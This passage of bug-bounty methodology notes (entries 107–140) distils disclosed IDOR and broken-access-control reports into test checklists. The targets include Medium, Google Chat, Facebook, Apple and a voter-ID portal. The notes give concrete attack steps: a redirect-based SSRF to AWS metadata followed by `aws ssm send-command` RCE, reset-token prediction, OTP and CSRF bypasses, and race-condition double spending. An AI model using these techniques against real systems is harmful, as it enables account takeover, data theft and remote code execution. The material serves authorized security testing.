### [107] Medium drafts — short 12-hex draft id viewable cross-account, and `/p/<id>` redirects to `/{@owner}/<id>` (id→owner mapping) — zer0d [INSTRUCTIVE: rejected as "feature, no rate-limit test allowed" — teaches scope/by-design nuance]
- Where: `https://medium.com/p/<12-hex-id>/edit` (draft); visiting `https://medium.com/p/<id>` 302s to `https://medium.com/{@nickname}/<id>`.
- Approach/how-found: noticed everything on Medium has a unique id + heavy GraphQL. With 2 own accounts, opened A's draft, swapped the id to B's draft → full draft rendered cross-account; the `/p/<id>`→`/@owner/<id>` redirect maps each id to its author. 12-hex ids → theoretically brute-forceable. BUT Medium ruled it "feature, not a bug" and program rules forbade real cross-user/rate-limit testing.
- Test: object preview/draft/share URLs with short ids are classic IDOR candidates AND owner-enumeration oracles (redirects that reveal the owner). Before claiming impact, confirm the access is unintended (not a public-by-design share) and that rate-limiting is actually absent — and respect program scope when proving enumeration.
- Q: "Do draft/preview/share ids render cross-account, and does any redirect leak the owner of an arbitrary id? Is this genuinely unauthorized, or an intended public share?"

### [108] "In GUID We Trust": check the UUID version digit → predict v1 reset tokens — Intruder/Daniel Thatcher [NEW: GUID version weakness]
- Where: password reset where the token is a GUID.
- Approach/how-found: the char after the 2nd hyphen is the UUID **version**. v4=random (safe), but **v1 = timestamp + clock-sequence + MAC node-id (predictable)**; v3/v5 = MD5/SHA1(name+namespace). For a v1 reset token: request a reset for YOUR account, feed the GUID to `guidtool` to extract node-id + clock-seq, note server `Date`, then generate every GUID for ±1s around the victim's reset time and submit them all → take over. Bonus: same-millisecond race — libraries +1 the timestamp of the 2nd GUID, so a visible GUID can reveal an invisible one.
- Test: decode every UUID's version; if not v4, treat it as predictable and attempt token prediction.
- Q: "Is this token a UUID, and what version is the digit after the 2nd hyphen? If v1/v3/v5, can I reconstruct the victim's reset/session token from time+node or name+namespace?"

### [109] Microsoft Office comments — impersonate any M365 user (cross-tenant) by tampering the client-supplied `S::email::ObjectID` author string — Meareg [NEW ★ identity fully client-supplied + Teams as ObjectID oracle]
- Where: Word/PowerPoint comment save `POST euc-word-edit.officeapps.live.com /we/OneNote.ashx?perfTag=PutChanges`; author = `"S::<email>::<ObjectID>"` + display name in the body.
- Approach/how-found: the comment author identity is taken entirely from request parameters. Replace display name + email + Object ID with a victim's → comment/author on the document as that user, without their involvement, even **cross-tenant**. Victim email + name + Object ID are harvested via the Microsoft Teams external-user search. Also adds the victim as a document author (version history). (MS called it "by design.")
- Test: when an action stamps an author/owner/actor from a client-supplied `email`/`ObjectID`/`S::` string, swap it to impersonate; use Teams/Directory/people-search as an Object-ID/email oracle. Collaboration metadata (comments, authors, activity) is often unauthenticated identity.
- Q: "Is the author/actor identity taken from a client-supplied email/objectID I can swap to impersonate (even cross-tenant)? Can I source the victim's objectID from Teams/directory search?"

### [110] Delete any user's image — read is public (no bug) but the DELETE isn't authorized; ids from page source — adilnbabras ($1,500) [NEW: test the destructive verb even when read is public]
- Where: profile has a long random id (visible in page source); each image/post/comment has its own id. Image view/upload is public.
- Approach/how-found: viewing others' images isn't a bug (public). But the DELETE-image request keyed by profile-id + image-id, when swapped to the victim's ids, returned 204 and deleted the victim's image → destructive IDOR across all users. Found by methodically replaying every captured request — including DELETE — after harvesting ids from page source.
- Test: don't dismiss public read access — replay the *destructive/state-changing* sibling (DELETE/PUT) with swapped ids; the write path is often unprotected even when reads are intentionally public. Harvest object ids from page source.
- Q: "Even if reading this object is public, is the DELETE/edit on it authorized? Did I replay the destructive verb with the victim's ids from page source?"

### [111] Apple consultants subdomain numeric IDOR (write) $7,500 — apapedulimu [DUP-ish reinforcement]
- Found via `site:*.apple.com` dorking → `consultants.apple.com` (a less-audited sub-app). Two accounts; the edit/save request used a numeric ID — change A's ID to B's → B's data changed (write IDOR). Lesson: hunt lesser-known sub-applications of big targets; simplest numeric write-IDOR still pays.

### [112] TikTok tag IDOR only after remove+re-tag (state-dependent) $3,000 — apapedulimu [NEW: state-dependent IDOR]
- Where: `POST .../mention/tag/update/v1` with `aweme_id` (video id), `add_uids`, `remove_uids`.
- Approach/how-found: directly swapping `aweme_id` to a victim's video did nothing. But when he first **removed a tag then tagged someone else**, the request gained a `remove_uids` param — and *now* swapping `aweme_id` to the victim's video succeeded → tag anyone on anyone's video. The IDOR only fires in a specific request STATE/param combo.
- Test: don't conclude "not vulnerable" from one request shape — exercise the feature through different states (add/remove/edit/reorder) and re-test the swap when extra params appear.
- Q: "Does this endpoint become exploitable only after a specific prior action that changes the request body (adds a param)? Have I tried every state of this feature, not just the default?"

### [113] Google Chat — IDOR remove members from ANY space: `itoCId` RPC in `batchexecute`, swap space ID + user ID → kick anyone (incl. managers) — hope ($3,133.70) [NEW: state-changing RPC keyed on attacker-supplied object+subject ids]
- Where: `POST /u/0/_/DynamiteWebUi/data/batchexecute?rpcids=itoCId` (chat.google.com); body carries `space/<id>` + `user/<id>`.
- Approach/how-found: capture the "Remove from space" action; it embeds both the space ID and the target user ID with no authorization that the caller manages that space. Replace both with the victim space/user → victim removed from any space.
- Test: for destructive group actions (remove/kick/transfer), both the container id AND the subject id are attacker-controlled — swap to act on groups you don't manage. Test state-changing RPCs, not just read RPCs.
- Q: "Can I remove/modify a member of a group I don't administer by replaying the remove RPC with their space+user ids? Is manager-status enforced server-side?"

### [114] Facebook — group expert "Badge Requests" leak: `GroupsCometExpertiseBadgeRequestsRootQuery` GraphQL keyed on `groupID`; swap to any PUBLIC group → pending expertise requests + names — hope [NEW: admin-only moderation queue readable by groupID swap]
- Where: `POST /api/graphql/` `fb_api_req_friendly_name=GroupsCometExpertiseBadgeRequestsRootQuery`, `variables={"groupID":X}`.
- Approach/how-found: pending expertise requests are admin-only in the UI; the backing GraphQL query only checks the groupID is valid, not that you admin it. Swap groupID → leaks experts' names + their pending requests for any public group.
- Test: admin/moderator-only "queues" (requests, approvals, reports) usually have a single GraphQL query behind them — swap the container id to read another tenant/group's queue.
- Q: "Is this admin-only list backed by one GraphQL query I can re-point at another group/page id? Does it check my admin role or just the id?"

### [115] Facebook — page "blocked collaboration invites" list leak: `CollaborationBlocklistBlockedPagesQuery` keyed on `owner_id`; swap → any page's blocklist — hope [DUP-reinforce: per-page settings list readable by owner_id swap]
- Where: `POST /api/graphql/` `CollaborationBlocklistBlockedPagesQuery`, `variables={"owner_id":X}`.
- Approach/how-found: the block list is admin-only in UI; trigger an unblock to capture the query, swap `owner_id` to the victim page → their blocked profiles/pages exposed.
- Test: page/account "settings" sub-lists (blocklist, allowlist, scheduled, drafts) each have a GraphQL query — fuzz `owner_id`/`page_id` to read others'.
- Q: "Which per-page settings lists are backed by an `owner_id`-keyed query I can swap? Are these treated as 'my settings' with no per-id authz?"

### [116] CMS-delete + user-delete IDOR — GET is protected but DELETE/PUT aren't; test every HTTP method on the id — jedus0r (P1) [NEW: write verb unprotected where read is]
- Where: `/api/v1/cms/<id>` and `/api/v1/users/<id>`.
- Approach/how-found: `PUT /api/v1/cms/419` → 200 (edit others' CMS); `DELETE` → deletes any customer's CMS (P3). On users, `GET /api/v1/users/<other>` → 403 (read protected!), but `DELETE /api/v1/users/<other>` → 200 → delete any user (PII exposed in the flow) = P1, mass user wipe.
- Test: never conclude "no IDOR" from a blocked GET — replay the same id with PUT/DELETE/PATCH; authz is frequently enforced only on the read path. Map identity (numeric id), send all id-bearing calls to Repeater, method-fuzz each.
- Q: "Is GET protected but DELETE/PUT/PATCH on the same id unprotected? Did I method-fuzz every id-bearing endpoint, not just read it?"

### [117] IDOR `building_id` → visitor PII → image `?url=` proxy → redirect-bypassed SSRF → AWS IMDS keys → SSM RCE — 0x0Asif ($3,200) [NEW ★ IDOR→SSRF→AWS SSM RCE chain]
- Where: `GET /visitors/?...&building_id=1266` (numeric IDOR → all visitors' PII+photos); visitor images served via an `?url=` proxy (S3).
- Approach/how-found: swap `building_id` → mass visitor PII. The image `?url=` only allowed the index page → he hosted a `header('Location: http://169.254.169.254/...',303)` redirect → the proxy followed it → full-read SSRF → AWS instance metadata → IAM access/secret/session keys → AWS CLI → `aws ssm describe-instance-information` then `aws ssm send-command --document-name AWS-RunShellScript` → RCE across instances.
- Test: an `?url=`/image-proxy that "only allows X" can be bypassed with a 30x redirect from your server; once SSRF reaches IMDS, pull IAM creds and try `ssm send-command` for RCE. Pair an IDOR (mass PII) with any url-fetcher in the same data.
- Q: "Is there a `url`/image-proxy param I can point at 169.254.169.254 (via redirect bypass)? Do leaked IAM creds allow `ssm send-command` (RCE)?"

### [118] Instagram: drop the heartbeat request → watch livestream invisibly — xdavidhu [NEW: kill-the-telemetry trick]
- Approach: Burp match/replace to break `live/<id>/heartbeat_and_get_viewer_count` → join a (practice/public) livestream with the host never seeing you and the viewer count never incrementing; host can't even remove you. (Vendor disputed, but the *technique* is gold for hiding presence/skipping checks.)
- Test: identify presence/heartbeat/telemetry/analytics requests and drop or corrupt them to become invisible or to skip a client-enforced step.
- Q: "Which heartbeat/presence/usage request, if dropped, hides my activity or bypasses a limit (seat count, viewer count, trial usage)?"

### [119] Two-step login — username-check response leaks full PII (user-enumeration → PII oracle) — Eslam Akl (P1) [NEW: login step-1 as PII oracle]
- Where: username-first login; submitting a username (before password) returns whether it exists.
- Approach/how-found: entering `test` returned an existing user AND all their PII (name, email, phone, firm, userID) in the response → Intruder a username wordlist → mass PII. No throttling.
- Test: in multi-step logins (username then password), inspect the username-validation response — it often returns far more than `exists:true` (PII, userID); enumerate usernames to harvest it.
- Q: "Does the username/identifier step of login leak PII or userID in its response? Can I enumerate usernames to harvest it at scale?"

### [120] Unsubscribe IDOR via `id`; `?u=` base64 timestamp required but not validated; userID from a leaky profile API — Sagar Sajeev [DUP reinforcement: unsubscribe id-swap + chained id leak]
- Where: unsubscribe link `?u=<base64 timestamp>&id=<userID>`.
- Approach/how-found: `?u=` is a base64 timestamp (must be present or 400, value not validated); swap `id` to the victim's → unsubscribe anyone. UserID is leaked by a profile API → chained to identify victims.
- Test: unsubscribe/notification links keyed by a user `id` with an unbound timestamp/token = IDOR; chain a profile/API that leaks userID to raise severity.
- Q: "Is the unsubscribe link keyed by a swappable `id` with an unvalidated timestamp, and can I source userIDs from a profile API?"

### [121] "Million Dollar IDOR" — GraphQL `stipendUser(id)` incremental id → thousands of Visa cards (number/CVV/expiry) + race-condition multi-redeem — Monish [NEW ★ GraphQL id-swap card dump + redeem race]
- Where: GraphQL; `getUserStipends` lists your cards; `getUserStipend($id:Int!)`/`stipendUser(id)` returns full card data (number, cvc, expiry) with an **incremental** id (45,46,47…).
- Approach/how-found: introspection to map queries/mutations; the per-card query's `id` was guessable/incremental → swap → any user's card (number/CVV/expiry) → thousands. Bonus: the cash-out flow generates a `quotationID`, then a separate request marks it paid — **race condition**: fire duplicate redeem requests simultaneously before the server marks the quote used → the converted amount pays out multiple times per card.
- Test: in GraphQL, run introspection then swap incremental int ids on the detail query (cards/orders/invoices). For any single-use asset (voucher/quote/coupon), test a race — send N parallel redeem requests so payouts fire before the "used" flag is set.
- Q: "Does a GraphQL detail query take an incremental int id returning others' sensitive objects? Is a single-use redeem/quote race-safe, or can parallel requests double-spend it?"

### [122] One page, 5 BAC variants — remove `disabled`, add non-editable fields to the PUT, randomize ids to create objects, tamper type enums, reuse one object's id to delete another — anon (€1,500) [NEW ★ exhaustive single-page BAC methodology]
- Where: school app, low-priv **parent** role, one student-contact page.
- Approach/how-found: (I) address fields disabled in UI but Save active → remove the `disabled` attribute (or Burp) → change a student's main address (frontend-only protection). (II) the PUT carries name/address fields the UI won't let you edit → include them anyway → they change. (III) randomize the trailing digits of every `*Id` in the PUT (except the page-key `learnerPersonalId`) → server *creates a new* parent-contact object instead of 403. (IV) change a `postalTitle`/type enum to `official` → reassign address types you shouldn't. (V) official address had no Delete button → take its `household` id and paste it into the residential **delete** request → delete it (IDOR).
- Test: exhaust a single sensitive page — strip `disabled`/hidden attrs, add fields the UI omits, randomize ids to force-create objects, tamper type/enum params, reuse one object's id in a sibling's delete/edit. Don't trust the absence of a UI button.
- Q: "Does the form enforce read-only/role only on the frontend? Can I add omitted fields to the PUT, randomize ids to create objects, flip type enums, or reuse one object's id in another's delete?"

### [123] Oracle SBC (Session Border Controller) — IDOR via `parentKey` in an XML `acmeWebReq dirListing` request lets a low-priv user list/download arbitrary folders (e.g. `BOOT`) — Harold Zang/Trustwave [NEW: appliance/thick-client XML API; folder-key param = directory IDOR → arbitrary file download]
- Where: carrier VoIP appliance web UI; folder navigation POSTs XML `<acmeWebReq ... category=system object=dirListing>` with a `parentKey` (subfolder) value.
- Approach/how-found: proxied the admin UI as a low-privileged user; clicking a subfolder (e.g. "Audit Logs") sent the folder path as `parentKey`. Changing `parentKey` to other folders (`BOOT`, etc.) returned their listings/files → unauthorized arbitrary file download. (One of several SBC bugs incl. DoS.)
- Test: on appliances/enterprise apps using XML/SOAP/RPC bodies, the "which folder/resource" selector (`parentKey`, `path`, `dir`, `node`) is an IDOR/traversal surface — swap it to privileged paths even as a low-priv user; proxy the thick UI to see these structured requests.
- Q: "Does a folder/resource key in the XML/RPC body get authorized per-object, or can a low-priv user point it at system folders to list/download files?"

### [124] Business-logic IDOR — swap `PID` at checkout (price stays); "share product" leaks the PID → buy $400 item for $10 — Sagar Sajeev [NEW: product/price binding mismatch]
- Where: e-commerce checkout POST with `amount` (server-validated) + `PID` (product id).
- Approach/how-found: `amount` couldn't be tampered (server validation), but `PID` could — add a $10 Product A to the cart, grab Product B's ($400) PID (from its cart entry or the "share this product" link), replace A's PID with B's while keeping `amount=$10` → checkout delivers the $400 product for $10. Price and product are validated independently, not bound.
- Test: at checkout, if `amount`/price is locked, swap the *product* id instead — many carts bind the charge to the cart total, not to the product fulfilled. "Share product" links leak the PID.
- Q: "Is the charged amount bound to the *product* id, or can I keep a cheap item's price while swapping in an expensive product's id? Where does the PID leak (share link, cart)?"

### [125] "Unexpected IDOR" + bypass checklist — whitespace suffix (`%20`) flips 401→200; HPP, special chars, method change, inject id into id-less requests — Bharat Singh [NEW ★ IDOR-bypass checklist]
- Where: `POST /account/teamsetting/retired_team?team_id=12345`.
- Approach/how-found: swapping `team_id` → 401, but appending `%20` (`team_id=<victim>%20`) → 200 → retire any team (no rate limit → mass). His reusable bypass list: (1) **HPP** `?custom_id=<me>&custom_id=<victim>`; (2) append special chars/whitespace `/`, `%20 %09 %0b %0c %1c %1d %1e %1f` to break the validator while the backend trims them; (3) change the HTTP method (GET/POST/PUT/DELETE/PATCH); (4) add an id param to an id-less request (`GET /api/card` → `GET /api/card?custom_id=<victim>`).
- Test: when an id-swap returns 401/invalid, don't give up — append trailing whitespace/special chars, pollute the param (HPP), change method, or inject the id into endpoints that don't normally take one.
- Q: "Did a 401 on id-swap stop me too early? Have I tried `%20`/special-char suffixes, HPP duplicate params, method changes, and injecting an id into id-less requests?"

### [126] Access-flag tampering + `ClientId` IDOR — read/write "No Access" clients; flip `CanControlClientAccess:false→true` — can1337 (€1,500) [NEW ★ mass-assign access flags + GUID param IDOR read+write]
- Where: pentest-management app; clients you lack access to.
- Approach/how-found: (I) the client-list response carried `"CurrentLogOnAccessType":"None"`,`"CanControlClientAccess":false`; editing them to `"Full"`/`true` (request + response manipulation) made a No-Access client show as Full Access → its Access panel revealed all users' roles + PII. (II) `GET /api/Missions?ClientId=<GUID>` returned a No-Access client's missions read-only — the GUID was readable from the client list in DevTools (surfaced via "Copy from Engagement"). (III) the create-mission request with a swapped `ClientId` GUID *added* missions to No-Access clients (write).
- Test: access/role flags returned in responses (`canControl`, `accessType`, `isOwner`) are often re-trusted on submit — flip them. Container ids (`ClientId`/`orgId` GUIDs) read from DevTools enable both read (`?ClientId=`) and write (create with swapped id) on resources hidden in the UI.
- Q: "Are access/role booleans honored from the request/response if I flip them? Does a `ClientId`/`orgId` param let me read AND create resources under containers I have no access to?"

### [127] proto.io — publicly readable Android crash reports (cookies + `AUTH_USERNAME`/`AUTH_PASSWORD`) at a predictable date/time path found by decompiling the APK: `https://proto.io/apps/crashreports/android/protoplayer/` — Ali Hassan Ghori ($100) [NEW ★ reverse-engineer the APK to discover an unauthenticated internal endpoint + predictable file path]
- Where: `https://proto.io/apps/crashreports/android/protoplayer/` (crash reports written to a fixed path keyed by date/time filename; no auth).
- Approach/how-found: downloaded the proto.io APK (apps.evozi.com apk-downloader), decompiled with **jadx-gui**, and found in the code a URL that exposes the current crash-report filename, with reports stored at a predictable date/time path.
- Exploit: hit the base crash-reports URL to learn the current report path, then opened the crash-report file URL directly (unauthenticated) → readable reports leaking cookies, remote addresses, and sometimes `AUTH_USERNAME`/`AUTH_PASSWORD`.
- Test: decompile mobile apps (jadx/apktool) to surface hidden/internal endpoints, log/crash-report uploaders, and hardcoded paths; crash/log/diagnostic files are frequently world-readable at predictable (date/time/id) paths and leak secrets.
- Q: "Does the mobile app reference an internal crash/log/diagnostics endpoint? Are those files at a predictable path, unauthenticated, and do they leak cookies/credentials?"

### [128] "Digging JS files" — CNAME-Wayback recon → metadata-leak defeats 'unguessable id is out of scope' → method-swap GET-for-PUT dumps every API key — Adnan Malik ($777 + $1337) [NEW ★ three-in-one: archive the CNAME host; harvest the unguessable UID from a protected action's response; switch HTTP method to bypass authz]
- Where: acquired entity `connect.target.com` (CNAME → `api.previous.com`); endpoints `PUT /api/v1/campaigns/action/cancel?campaign_id=` and `/api/v1/api-keys/<id>`.
- Approach/how-found: (1) RECON — current host's JS was dry, so he ran Wayback against the **CNAME target** `api.previous.com` and found an old heavy app JS exposing endpoints. (2) `cancel?campaign_id=` was authz-protected (can't cancel others), BUT its **response leaked the owner's metadata** (AccountId, **AccountUid**, SubAccountUid, CampaignName...). Program scoped out "IDOR with unguessable ids" — so he used this leak to **harvest the unguessable AccountUid**, then used those ids to exploit two real IDORs (promote user→admin; edit others' profiles). (3) `PUT /api/v1/api-keys/<victimId>` returned 404, so he **changed the method to GET** → it rendered the victim's API key; Intruder over ids dumped everyone's keys (critical).
- Test: (a) recon the CNAME/old hostname in Wayback, not just the live host. (b) A "protected" action whose response still echoes owner metadata is an id-harvesting oracle that defeats "unguessable-id is out of scope". (c) If a verb is blocked (404/403 on PUT/DELETE), re-try the SAME path with GET/POST/HEAD/PATCH — authz is often per-method.
- Q: "What does the CNAME host's archived JS reveal? Does a protected action leak the owner's unguessable id in its response? If one HTTP method is blocked, does another method on the same object id succeed?"

### [129] "Developer's nightmare" — one IDOR, three fix bypasses: same bug on another subdomain, trailing `/`, and case-change `/BUILDER/` — Marcos IAF ($1,125) [NEW ★ revisit + path-authz bypasses]
- Where: `partner.redacted.com` campaign add/edit POST `{"affiliateid":12345,...}` (sequential IDOR).
- Approach/how-found: original IDOR (swap sequential `affiliateid` to add/edit anyone's campaigns, exhausting their paid quota). Fix1 removed `affiliateid`, used cookie auth → **Bypass1**: JS revealed `embed.redacted.com` builder with the same `affiliateId` IDOR. Fix2 → custom 403 → **Bypass2**: append a trailing `/` → 200. Fix3 → **Bypass3**: capitalize the directory `/builder`→`/BUILDER/` (the path filter was case-sensitive) → 200.
- Test: always re-test fixed reports; hunt the same function on sibling subdomains (embed/preview/builder); when a path is 403'd by a filter, try trailing `/`, case changes, double slashes, `%2e` — path-based authz/WAF filters are brittle.
- Q: "Has the fix just moved/blocked the path? Does the same function exist on another subdomain? Does a trailing `/`, case change, or encoding bypass the 403 filter?"

### [130] Self-IDOR to bypass plan limits — manage/share your OWN *locked* lists by reusing their `bookmark_id` — can1337 [NEW ★ IDOR against your own gated objects = premium bypass]
- Where: free plan allows 3 active lists; extra lists are "locked" (no manage/rename/share). `bookmark_id` isn't enumerable (403 for others).
- Approach/how-found: the locked lists are *his own*, just feature-gated. He copied a locked list's `bookmark_id` from DevTools and used it in an *unlocked* list's rename/share request → renamed, added icons, and **shared** the locked list (via `redacted.com/lists/<bookmark_id>`) — bypassing the premium lock. No separate authz for locked-state, so an id-swap among your own objects defeats the gate.
- Test: IDOR isn't only about *other users'* ids — reuse the id of your own locked/expired/trial/disabled object in the action meant for an active one to bypass plan/feature gating. Locked-state is often UI-only.
- Q: "Can I act on my own locked/expired/over-quota object by reusing its id in the flow meant for an active one (bypassing the paywall/feature gate)?"

### [131] Google bughunters — submit a bug report as a victim by swapping the `email` in the submit request — Virtuvil [DUP reinforcement: action-as-victim via client-supplied email]
- Where: bughunters.google.com report submission.
- Approach/how-found: while submitting his own report he intercepted it, changed the email to `victim@mail.com` → 200, report filed under the victim's account (HTML/text injection also possible via other fields).
- Test: report/feedback/submission flows often stamp the submitter from a client-supplied email — swap it to file/act as another user.
- Q: "Does a submit/report action take a client-supplied `email`/owner I can swap to act as the victim?"

### [132] Invite-only app — brute 6-digit invite codes, then privesc via the SIGNUP `role` param (isAdmin→superAdmin) + ATO IDORs — evilmango [NEW ★ role mass-assignment at registration; revisit signup post-login]
- Where: registration requires a 6-digit invite code; responses expose `isAdmin`, later `isSuperAdmin`.
- Approach/how-found: no rate limit → Turbo Intruder brute-forced 6-digit invite codes (20-30 valid in 10 min) → registered. Post-login tampering of `isAdmin` failed. The breakthrough: the **signup** request (post-login, needs no invite code) accepts a `role` — set `role=admin` at signup → admin; the response then revealed `isSuperAdmin` → `role=superAdmin` → superadmin. Then IDORs (email+password in requests) → all-users ATO + data change.
- Test: brute short invite/referral codes when unthrottled. Privilege fields rejected post-login are often honored at **registration** — set `role`/`isAdmin` in the signup body; read responses for higher tiers (`isSuperAdmin`) to escalate again.
- Q: "Are invite/referral codes short and unthrottled? Does the SIGNUP request accept a `role`/`isAdmin` the post-login flow rejects? Do responses reveal a higher role to climb to?"

### [133] Defeat unguessable login/invite tokens by enumerating the URL-shortener hash that expands to them — Sicksec [NEW ★ shortener as the weak link]
- Where: passwordless logins / private invites sent as short links: `shortener/{HASH}` → `site.com/?token=<unguessable>`.
- Approach/how-found: the final `token` is unbruteforceable, but the **short hash** that redirects to it is short/sequential (or the links are harvestable from the company's Twitter/emails). Enumerate/expand the shortener hashes → recover the unguessable tokens → passwordless login/invite/ATO or info disclosure. (Trigger emails and view source for shortener links; scrape the company's posted links.)
- Test: when impact is blocked by an unguessable token, check if it's delivered via a URL shortener — enumerate/expand short hashes (or scrape published links) to recover the underlying token. Both third-party (bit.ly) and custom shorteners qualify.
- Q: "Are magic-login/invite tokens delivered via a shortener whose hash I can enumerate or scrape to recover the unguessable token?"

### [134] Payatu — delete ANY account: the delete-user request works with the COOKIE removed and accepts ANY `X-Csrf-Token` (e.g. `ABCD`); object id isn't a UUID → unauthenticated mass deletion — Rajesh R [NEW ★ header games: strip the cookie + forge a junk CSRF token; non-UUID id]
- Where: e-commerce app delete-user endpoint; `X-Csrf-Token` header + cookie; invitation request exposed a `user_number` param.
- Approach/how-found: intercepted the delete-user request; removing the cookie header entirely still worked (no auth) — but a `X-Csrf-Token` was required (403 without it). He then found the token wasn't validated: any random string like `X-Csrf-Token: ABCD` was accepted. With a guessable (non-UUID) user id, this let an unauthenticated attacker delete anyone's account.
- Test: on destructive actions, strip the Cookie/Authorization header to test for missing auth; if a CSRF token blocks you, try a junk/placeholder value (servers often check presence, not validity). Treat non-UUID object ids as enumerable.
- Q: "Does this destructive request still work with the cookie removed? Is the CSRF token actually validated, or does any string pass? Is the target id a guessable non-UUID?"

### [135] Private-project IDOR on the uploads/CDN subdomain (unauthenticated, id-enumerable) — Hamzadzworm [NEW: assets subdomain unauth + main≠subdomain security]
- Where: main site secure, but `uploads.target.com/get_image/project/<id>_282x210.png` serves project assets.
- Approach/how-found: a sibling subdomain shared the main login (reused creds → logged in). Project images came from an uploads subdomain keyed by project id → change the id → other users' projects, and it worked even **unauthenticated** (private browser) → view any private project. A second subdomain had the same function → doubled the bounty.
- Test: "main domain is secure" ≠ subdomains; test login reuse across subdomains, and check that CDN/uploads/asset URLs (`uploads.`, `cdn.`, `/get_image/`) aren't unauthenticated and id-enumerable. Sweep sibling subdomains for the same function.
- Q: "Are project/file assets served from an uploads/CDN subdomain by an enumerable id with no auth? Does login work on sibling subdomains, and do they repeat the same IDOR?"

### [136] Apple order-tracking IDOR ($10k) — `order_id` = `APP`+7 digits brute via the JSON API; bypass the CryptoJS fix by re-implementing the client encryption — Ahmad Halabi [NEW ★ guessable order id + reverse client-side crypto to brute]
- Where: Apple Pay Supplies; track order by `order_id` (`APP1162306`) + `email`.
- Approach/how-found: the track page was blank (JS fetch), so he found the API `/api/Home/GetOrderStatus`; `order_id` = `APP` + 7 digits → Intruder brute (no rate limit) → shipping PII of any order whose email you know. Fix1 removed the API and encrypted `email`+`order_id` with **CryptoJS** client-side → he read the JS, re-implemented the same CryptoJS encryption in a script, and brute-forced again (still no rate limit). Apple finally lengthened the order id to `APP`+28 chars — they never added rate limiting.
- Test: order/tracking ids like `PREFIX`+N-digits are brute-forceable; if the page is blank, find the JSON API behind it. When values are encrypted client-side (CryptoJS), reverse the JS and reproduce the encryption to keep brute-forcing — client crypto isn't rate limiting.
- Q: "Is the order/tracking id a short prefixed number I can brute via the underlying API? If values are client-encrypted, can I reproduce the crypto from the JS and continue brute-forcing (no rate limit)?"

### [137] Voter-ID portal — structured EPIC brute (region prefix + 7 digits) → claim ids to your profile → forms auto-fill victim PII; OTP=0 ATO; delete-by-claimed-id — Aziz Al Aman [NEW ★ claim-object-then-read + structured id brute + OTP-zero]
- Where: India voter-ID portal (780M users); EPIC number = 3 region letters + 7 digits.
- Approach/how-found: (1) the EPIC prefix is region-fixed, only 7 digits vary → Intruder `Epic_no=WRI$2345678$` (no rate limit, 302 = valid) → harvest valid EPICs; **add a victim's EPIC to your profile** → `form001` auto-fills with that person's name/father/address/DOB → mass PII. (2) OTP bypass: set the OTP param to `0` → verified → replacing the victim's number auto-loaded the victim's profile → ATO. (3) after claiming a victim EPIC, "Deletion of Enrolment" deletes their card permanently.
- Test: structured government/loyalty ids (region/branch prefix + sequence) are brute-forceable; the "claim/link an object to my account" flow then exposes its full details (and enables delete) — a read+destroy primitive. Always try OTP=`0`/`000000`/empty and response-tamper.
- Q: "Is the id a fixed-prefix + short numeric sequence I can brute? Does claiming/linking an object to my profile reveal its owner's PII or let me delete it? Does OTP accept `0`/empty?"

### [138] Larksuite 1-month hunt (15 bugs) — recon-from-docs + admin space-manage IDOR (userID+parentToken), tenant-join via `TestTenantID` swap, self-approve app privesc, API version-downgrade & UI-only authz — Snapsec [NEW ★★ enterprise SaaS BAC master set]
- Where: Lark collaboration suite (messenger/docs/calendar/meetings), heavy RBAC + file sharing.
- Approach/how-found (reusable techniques):
  - **Recon from product material**: read the docs, official YouTube tutorials, third-party walkthroughs, and helpdesk/community Q&A to learn every feature/role *before* tooling.
  - **Admin folder IDOR (read+write)**: `GET /suite/admin/space_manage/user_folder?userID=<id>` returns a user's directories + tokens; add `&parentToken=<token>` to list files (each with a download token); `POST` the same endpoint to create folders in others' dirs.
  - **Tenant takeover (critical)**: `POST /sandbox/AddTestTenantMember {"TestTenantID":<random numeric>,"Email":...}` — swap `TestTenantID` → join ANY tenant → read its files/chats (incl. Lark's own internal tenant).
  - **Self-approve app → mass privesc**: a low-priv "App management" user calls `PUT /suite/admin/appcenter/app/<id>/auditWhiteList {"audit_white_list_status":1}` to approve his own app → the app token grants admin-level APIs.
  - **Scope-field emptying**: adding a user as a sub-dept admin with `"departments":[]` (empty) adds them to the MAIN org.
  - **UI-only authz**: admin logs `GET /suite/admin/logs/` and other actions are blocked only in the UI — the API returns full data to a low-priv user.
  - **API version downgrade**: comments `GET /space/api/message/get_message.v3/` → 403; change `v3`→`v2` → returns the comments (older version skips the check).
  - **Helpdesk file IDOR**: private ticket files live at a guessable file-id URL viewable by teammates; a viewer can even permanently delete an admin's trash via `trash/delete` with the folder id.
- Test: learn the product from its own docs/videos first; on enterprise SaaS hammer admin `space_manage`/`employees`/`logs`/`appcenter` endpoints from a low-priv role; swap tenant/org ids; empty scope arrays (`departments:[]`); downgrade API versions (`v3`→`v2`/`v1`); self-approve apps; treat every missing/disabled UI control as API-reachable.
- Q: "Can a low-priv role hit admin space/employee/log/app endpoints directly? Can I swap a tenant/org id to join another tenant? Does emptying a scope array widen my reach? Does an older API version skip the authz the new one enforces? Can I self-approve an app for a token?"

### [139] Apple email-verification bypass — replace the opaque token in the verify link with your plaintext email — Aravind [DUP reinforcement: verification keyed by swappable email]
- Where: subdomain email-verification link with `email id=<opaque string>`.
- Approach/how-found: replaced the opaque `id` string with the literal email (`abc@gmail.com`) → verification passed / signup completed without truly verifying.
- Test: in verify/confirm links, try replacing the opaque token with the plaintext email/username — some flows accept the identifier directly and skip token validation.
- Q: "Does the verification link accept my plaintext email in place of the opaque token (skipping real verification)?"

### [140] Admin↔admin change-password IDOR — defeat `412 Precondition Failed` by swapping the id across the full OPTIONS/GET/PATCH sequence (fresh ETag) — dhakal_bibek ($2,000) [NEW ★ ETag/If-Match conditional-header IDOR technique]
- Where: `PATCH /api/v3/myhealth/users/<id>` `{password}` (old password not validated); two admins.
- Approach/how-found: swapping the victim admin's id in Repeater → `412 Precondition Failed` because the request carries conditional headers (`If-Match`/`If-None-Match` ETag) tied to the object. Fix: swap the id in the live **intercept across all three requests** (OPTIONS → GET → PATCH) so the GET fetches the victim's *current* ETag that the PATCH's `If-Match` then satisfies → password changed → ATO of the other admin. (Tools: Autorize, PWNfox for Firefox containers, Crane for iOS app containers; same-role access control is often overlooked.)
- Test: a `412` on id-swap means an ETag/`If-Match` is bound to the object — replay the *whole* conditional sequence (OPTIONS/GET/PATCH) with the swapped id via intercept so the GET supplies the matching ETag. Always test access control between same-role users (admin↔admin), and whether change-password validates the old password.
- Q: "Did a 412/precondition error stop me? Can I swap the id through the full OPTIONS/GET/PATCH flow so the GET fetches the victim's ETag for the PATCH? Is there access control between same-role users, and is the old password checked?"

